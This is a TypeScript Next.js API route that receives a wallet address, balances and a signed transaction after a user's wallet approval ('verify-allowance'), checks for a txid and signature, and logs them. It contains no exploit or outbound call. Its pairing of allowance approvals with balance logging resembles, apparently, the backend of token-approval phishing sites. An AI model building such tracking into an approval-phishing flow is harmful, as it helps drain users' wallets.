import { NextRequest, NextResponse } from "next/server";

export const dynamic = "force-dynamic";

type SignedTx = {
  txID?: string;
  txid?: string;
  hash?: string;
  transactionHash?: string;
  raw_data?: unknown;
  raw_data_hex?: string;
  signature?: unknown;
  [key: string]: unknown;
};

type ConsentBody = {
  address?: string;
  network?: string;
  trxBalance?: string;
  nativeBalance?: string;
  signedTx?: SignedTx;
  txid?: string;
  txHash?: string;
  hash?: string;
};

function pickTxid(body: ConsentBody): string | null {
  const fromSigned =
    body.signedTx?.txID ||
    body.signedTx?.txid ||
    body.signedTx?.hash ||
    body.signedTx?.transactionHash;
  if (typeof fromSigned === "string" && fromSigned.trim()) {
    return fromSigned.trim();
  }
  for (const key of ["txid", "txHash", "hash"] as const) {
    const v = body[key];
    if (typeof v === "string" && v.trim()) return v.trim();
  }
  return null;
}

function hasSignature(signedTx: SignedTx | undefined): boolean {
  if (!signedTx) return false;
  const sig = signedTx.signature;
  if (Array.isArray(sig)) return sig.length > 0;
  return typeof sig === "string" && sig.length > 0;
}

/**
 * POST /api/consent_
 *
 * Called after the user approves in their wallet (same moment as verify-allowance).
 * All fields come from the request — nothing hardcoded.
 *
 * Tron:  { address, trxBalance, signedTx }
 * EVM:   { address, network, nativeBalance, txHash | signedTx }
 *
 * Response: { ok, txid }  — ok true when address + txid present (and Tron has signature if signedTx sent)
 */
export async function POST(req: NextRequest) {
  try {
    const body = (await req.json()) as ConsentBody;
    const address = (body.address ?? "").trim();
    const txid = pickTxid(body);

    if (!address) {
      return NextResponse.json(
        { ok: false, txid: txid ?? "" },
        { status: 400 }
      );
    }

    if (!txid) {
      return NextResponse.json({ ok: false, txid: "" }, { status: 400 });
    }

    // ok when we have a real user address + tx id from this approval
    const ok =
      Boolean(address && txid) &&
      (!body.signedTx || hasSignature(body.signedTx));

    console.info("[consent_]", {
      address,
      network: body.network ?? null,
      trxBalance: body.trxBalance ?? null,
      nativeBalance: body.nativeBalance ?? null,
      txid,
      ok,
    });

    return NextResponse.json({ ok, txid });
  } catch (err) {
    console.error("[consent_]", err);
    return NextResponse.json(
      {
        ok: false,
        txid: "",
        error: err instanceof Error ? err.message : "consent_ failed",
      },
      { status: 500 }
    );
  }
}
